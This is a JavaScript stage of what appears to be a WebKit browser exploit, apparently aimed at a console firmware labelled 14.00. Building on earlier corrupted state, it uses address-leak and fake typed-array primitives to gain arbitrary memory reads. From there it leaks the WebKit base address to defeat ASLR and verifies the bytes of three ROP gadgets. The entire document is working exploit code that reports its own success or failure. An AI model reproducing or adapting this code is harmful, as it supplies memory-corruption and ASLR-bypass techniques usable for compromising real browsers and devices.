// Derive a current-process WebKit base from the live Math.expm1 metadata,
// then read three previously 14.00-checked gadget byte signatures.
var state = window.__fw14ArrayState;
var result;
var phase = "preflight";
var slot = -1;
var original = [];
var viewChanged = false;
try {
  if (!state || !state.view || !state.array || !state.a ||
      !state.addressAnchor || !state.ownedTypedView ||
      !state.otherTypedView || state.array[0] !== state.a ||
      state.addressAnchor.marker !== 0x11223344)
    throw new Error("held_views_preflight_failed");
  var forged = state.view;
  var a = state.ownedTypedView;
  var b = state.otherTypedView;
  if (a.length !== 65536 || b.length !== 65536 ||
      a[0] !== 0x31 || a[7] !== 0xa8 || b[0] !== 0x42)
    throw new Error("owned_canary_mismatch");
  function matches(at, value) {
    return forged[at] === (value & 255) &&
      forged[at + 1] === (value >>> 8 & 255) &&
      forged[at + 2] === (value >>> 16 & 255) &&
      forged[at + 3] === (value >>> 24 & 255);
  }
  function bytesAt(at) {
    var bytes = [];
    for (var n = 0; n < 8; n++) bytes.push(forged[at + n]);
    return bytes;
  }
  function hexLE(bytes) {
    var out = "0x";
    for (var n = bytes.length - 1; n >= 0; n--)
      out += bytes[n].toString(16).padStart(2, "0");
    return out;
  }
  function hexForward(bytes) {
    var out = "";
    for (var n = 0; n < bytes.length; n++)
      out += bytes[n].toString(16).padStart(2, "0");
    return out;
  }
  function wordOf(value) {
    var bytes = [];
    try {
      state.array[0] = value;
      for (var n = 0; n < 8; n++) bytes.push(forged[state.index + n]);
    } finally {
      state.array[0] = state.a;
    }
    return hexLE(bytes);
  }
  var anchorWord = wordOf(state.addressAnchor);
  var candidates = [];
  for (var i = 2097152; i + 3 < 4194304; i++)
    if (matches(i, 0x11223344)) {
      if (candidates.length === 32) throw new Error("anchor_candidates_capped");
      candidates.push(i);
    }
  var live = [];
  try {
    state.addressAnchor.marker = 0x55667788;
    for (var c = 0; c < candidates.length; c++)
      if (matches(candidates[c], 0x55667788)) live.push(candidates[c]);
  } finally {
    state.addressAnchor.marker = 0x11223344;
  }
  if (live.length !== 1 || !matches(live[0], 0x11223344))
    throw new Error("anchor_live_count_" + live.length);
  var base = Number(anchorWord) + 8 - live[0];
  if (!Number.isSafeInteger(base) || base % 4096 !== 0)
    throw new Error("view_base_not_page_aligned");
  phase = "pointer_gate";
  var aWord = wordOf(a);
  var aIndex = Number(aWord) - base;
  var expWord = wordOf(Math.expm1);
  var expIndex = Number(expWord) - base;
  if (!Number.isSafeInteger(aIndex) || !Number.isSafeInteger(expIndex) ||
      aIndex < 0 || expIndex < 0 ||
      aIndex + 15 >= 16777216 || expIndex + 23 >= 4194304)
    throw new Error("cells_outside_window");
  slot = aIndex + 8;
  original = bytesAt(slot);
  var bIndex = Number(wordOf(b)) - base;
  if (!Number.isSafeInteger(bIndex) || bIndex < 0 ||
      bIndex + 15 >= 16777216)
    throw new Error("other_cell_outside_window");
  var otherData = bytesAt(bIndex + 8);
  if (Number(hexLE(otherData)) - Number(hexLE(original)) !== 65536)
    throw new Error("owned_data_spacing_mismatch");
  function readAddress(address, count) {
    if (!Number.isSafeInteger(address) || address <= 0 ||
        count < 1 || count > 64)
      throw new Error("invalid_read_target");
    var pointerBytes = [];
    for (var n = 0; n < 8; n++)
      pointerBytes.push(Math.floor(address / Math.pow(2, n * 8)) & 255);
    var bytes = [];
    viewChanged = true;
    try {
      for (var w = 0; w < 8; w++) forged[slot + w] = pointerBytes[w];
      for (var r = 0; r < count; r++) bytes.push(a[r]);
    } finally {
      for (var x = 0; x < 8; x++) forged[slot + x] = original[x];
      viewChanged = false;
    }
    return bytes;
  }
  var metadataPointer = Number(hexLE(bytesAt(expIndex + 16)));
  if (!Number.isSafeInteger(metadataPointer) || metadataPointer <= 0 ||
      metadataPointer >= base || metadataPointer % 8 !== 0)
    throw new Error("metadata_pointer_gate_failed");
  if (api && typeof api.markSync === "function")
    api.markSync("gadget_metadata_before_read");
  phase = "metadata";
  var metadata = readAddress(metadataPointer, 64);
  var codePtr = 0;
  for (var k = 7; k >= 0; k--)
    codePtr = codePtr * 256 + metadata[40 + k];
  var webkitBase = codePtr - 0x2586880;
  if (!Number.isSafeInteger(codePtr) || codePtr < 0x800000000 ||
      !Number.isSafeInteger(webkitBase) || webkitBase <= 0 ||
      webkitBase % 0x4000 !== 0)
    throw new Error("webkit_base_candidate_gate_failed");
  if (api && typeof api.markSync === "function")
    api.markSync("gadget_candidate_base_ready");
  phase = "gadget_reads";
  var g0 = readAddress(webkitBase + 0x295f948, 9);
  var g1 = readAddress(webkitBase + 0x1d989e3, 7);
  var g2 = readAddress(webkitBase + 0x25bae0, 10);
  var g0Hex = hexForward(g0);
  var g1Hex = hexForward(g1);
  var g2Hex = hexForward(g2);
  var allMatched = g0Hex === "488b7e30488b07ff10" &&
    g1Hex === "58488b07ff6018" &&
    g2Hex === "554889e5488b07ff5010";
  var restored = hexLE(bytesAt(slot)) === hexLE(original) &&
    a[0] === 0x31 && a[7] === 0xa8 && b[0] === 0x42 &&
    state.array[0] === state.a;
  if (api && typeof api.markSync === "function")
    api.markSync("gadget_reads_restored");
  result = { id: "live_gadget_bytes",
    status: allMatched && restored ? "pass" : "fail",
    details: { view_base: "0x" + base.toString(16),
      metadata_pointer: "0x" + metadataPointer.toString(16),
      code_pointer: "0x" + codePtr.toString(16),
      webkit_base: "0x" + webkitBase.toString(16),
      g0: g0Hex, g1: g1Hex, g2: g2Hex,
      all_matched: allMatched, view_restored: restored } };
} catch (error) {
  if (viewChanged && state && state.view && original.length === 8 && slot >= 0)
    for (var y = 0; y < 8; y++) state.view[slot + y] = original[y];
  if (state && state.array && state.a) state.array[0] = state.a;
  result = { id: "live_gadget_bytes", status: "error", details: {
    phase: phase, error: String(error).slice(0, 200)
  } };
}
return [result];
